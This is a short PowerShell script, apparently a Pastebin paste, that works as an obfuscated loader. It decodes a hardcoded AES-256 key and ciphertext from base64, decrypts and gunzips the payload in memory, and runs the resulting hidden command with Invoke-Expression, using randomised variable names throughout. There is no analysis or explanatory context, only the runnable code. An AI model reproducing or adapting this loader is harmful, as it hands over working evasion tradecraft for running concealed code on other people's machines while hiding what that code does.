# https://pastebin.com/QUGiWTHj
$cfii = [System.Convert]::FromBase64String("zDYGjpptXWqJootb7OdcR/JaGJswRA3EywKlPTHHZMQ=")
$vcqw = New-Object "System.Security.Cryptography.AesManaged"
$hctqdvb = [System.Convert]::FromBase64String("iLwgysA+ONk7XmrxKXagmRHh2a8v7JFj/xoQddCTkQN91XcJesX5FjXQuwudVJBtzokdOrTlq+4ymOvaMKYKwA==")
$vcqw.BlockSize = 128
$vcqw.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$vcqw.Mode = [System.Security.Cryptography.CipherMode]::CBC
$vcqw.KeySize = 256
$vcqw.Key = $cfii
$vcqw.IV = $hctqdvb[0..15]
$yitexde = New-Object System.IO.MemoryStream(,$vcqw.CreateDecryptor().TransformFinalBlock($hctqdvb,16,$hctqdvb.Length-16))
$rosvmap = New-Object System.IO.MemoryStream
$bweg = New-Object System.IO.Compression.GzipStream $yitexde, ([IO.Compression.CompressionMode]::Decompress)
$bweg.CopyTo($rosvmap)
$vcqw.Dispose()
$yitexde.Close()
$korri = [System.Text.Encoding]::UTF8.GetString($rosvmap.ToArray())
$bweg.Close()
Invoke-Expression($korri)
